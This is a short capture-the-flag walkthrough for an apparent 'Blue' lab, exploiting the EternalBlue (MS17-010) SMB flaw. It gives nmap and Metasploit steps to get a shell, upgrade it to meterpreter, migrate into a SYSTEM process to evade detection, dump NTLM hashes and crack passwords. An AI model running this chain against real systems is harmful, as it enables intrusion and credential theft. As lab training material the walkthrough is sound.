# Blue

### **Tasks**:

1. **Recon**:
   1. Do nmap version scan along with vuln script to find vulnerability
      1. `nmap -sV --script vuln ip`
      2. Vulnerable to CVE-2017-0143 or ms17-010 found.\[Eternal Blue] from nmap results - Answer all questions based on this output.
2. **Gain Access**:
   1. Start metasploit console , search ms17-010, use exploit/windows/smb/ms17\_010\_eternalblue, set RHOSTS to victim ip and run.
   2. Background session by pressing ctrl+z
3. **Escalate**:
   1. Convert shell to meterpreter: use post/multi/manage/shell\_to\_meterpreter , SET LHOST to attacker ip and SESSION (backgrounded session id , use sessions -l to list sessions).
   2. Execute **run**  to get meterpreter session and run `sessions -i meterpreter_`_`session_id` to switch to meterpreter session. Run _`getsystem` to verify we got system access and are NT AUTHORITY\SYSTEM indeed.
   3. Use `ps` to list all process, migrate to any process running as system using `migrate pid`**, **we are injecting our meterpreter in running process to get stable and make our shell less detective.
4. **Cracking**:
   1. type `hashdump` in meterpreter session and obtain NTLM credential hash dump.
   2. Use [crackstation](https://crackstation.net), john or hashcat to get password of Jon.
5. **Find flags!**:
   1. run `search -f flag*` in meterpreter session, you will find location of flags.
   2. Do `cat location_`_`of_`_`flag` for all 3 flag locations and submit the flags !!!
